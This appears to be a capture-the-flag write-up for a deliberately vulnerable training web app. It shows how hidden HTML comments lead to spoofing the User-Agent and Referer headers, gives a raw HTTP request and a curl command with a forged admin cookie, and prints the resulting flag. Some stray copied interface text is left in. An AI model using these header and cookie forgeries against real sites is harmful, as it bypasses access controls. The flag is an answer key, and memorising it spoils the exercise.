# Exploit
1. Visit the URL: `/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c` 
   (linked at the bottom of the main page).
2. Check the source code of the page to find the following comments:
   - "You must cumming from : https://www.nsa.gov/ to go to the next step"
   - "Let's use this browser : ft_bornToSec. It will help you a lot."
3. These comments suggest modifying the `User-Agent` and `Referer` headers in the HTTP request.

### Steps:
Send an HTTP request with the following headers:

GET /index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c HTTP/1.1 Host: 192.168.0.30 User-Agent: ft_bornToSec Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: https://www.nsa.gov/ Connection: keep-alive Cookie: I_am_admin=68934a3e9455fa72420237eb05902327 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0, no-cache Pragma: no-cache

bash
Toujours afficher les détails

Copier le code

Alternatively, use the following `curl` command:

```bash
curl 'http://x.x.x.x/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \\
-H 'User-Agent: ft_bornToSec' \\
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \\
-H 'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3' \\
--compressed \\
-H 'Referer: https://www.nsa.gov/' \\
-H 'Connection: keep-alive' \\
-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \\
-H 'Upgrade-Insecure-Requests: 1' \\
-H 'Cache-Control: max-age=0, no-cache' \\
-H 'Pragma: no-cache' | grep 'The flag is'
The HTTP response will contain the flag: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188.